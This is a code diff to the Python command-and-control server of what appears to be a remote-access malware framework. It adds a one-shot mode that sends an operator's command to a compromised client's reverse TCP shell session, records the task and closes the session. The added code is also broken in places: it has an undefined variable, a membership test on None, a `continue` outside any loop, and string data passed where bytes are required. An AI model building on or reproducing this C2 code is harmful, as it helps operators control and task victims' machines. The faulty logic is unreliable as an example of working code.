@@ -925,7 +925,7 @@ class C2():
     #     return "Catching end case"
 
 
-    def session_shell(self, session):
+    def session_shell(self, args_string):
         """
         Interact with a client session through a reverse TCP shell
 
@@ -933,6 +933,11 @@ class C2():
         :param int session:   session ID
 
         """
+
+        args = args_string.split(" ")
+        session = args[0]
+        cmd = " ".join(args[1:])
+
         if globals()['debug']:
             util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
         if not str(session).isdigit() or int(session) not in self.sessions:
@@ -946,7 +951,10 @@ class C2():
             self.current_session = self.sessions[int(session)]
             util.display("\n\nStarting Reverse TCP Shell w/ Session {}...\n".format(session), color='white', style='normal')
             self.current_session._active.set()
-            return self.current_session.run()
+            conn = None
+            if int(session) in conn:
+                conn = self.unix_sockets[int(session)]
+            return self.current_session.run(conn, cmd)
 
     def session_background(self, session=None):
         """
@@ -1223,11 +1231,43 @@ class Session(threading.Thread):
             # empty header; peer down, scan or recon. Drop.
             return 0
 
-    def run(self):
+    def run(self, conn = None, cmd = None):
         """
         Handle the server-side of the session's reverse TCP shell
 
         """
+
+        # If the connection is not on the screen and of the form "shell 1 cmd arg arg"
+        if cmd is not None:
+            # Run the command
+            cmd, _, action  = command.partition(' ')
+            if cmd in globals()['c2'].commands and callable(globals()['c2'].commands[cmd]['method']):
+                method = globals()['c2'].commands[cmd]['method']
+                if callable(method):
+                    result = method(action) if len(action) else method()
+                    if result:
+                        task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
+                        conn.sendall(result.encode())
+                        globals()['c2'].database.handle_task(task)
+                    else:
+                        conn.sendall("Error! Malformated return value from command! Session scheduled and ran command '" + cmd + "'but it returned a None value. Please return a string")
+                    continue
+                else:
+                    conn.sendall("Error! Malformated method in Session! Session regiestered the method in C2.method[" + cmd + "] as callable when it, in fact, wasn't.")
+            else:
+                task = globals()['c2'].database.handle_task({'task': command, 'session': self.info.get('uid')})
+                self.send_task(task)
+
+            # Exit the session properly
+            time.sleep(1)
+            globals()['c2'].session_remove(self.id)
+            self._active.clear()
+            globals()['c2']._return()
+
+            return
+
+
+        # If the connection is actually on the screen and not of the form "shell 1 cmd arg arg"
         while True:
             if self._active.wait():
                 task = self.recv_task() if not self._prompt else self._prompt
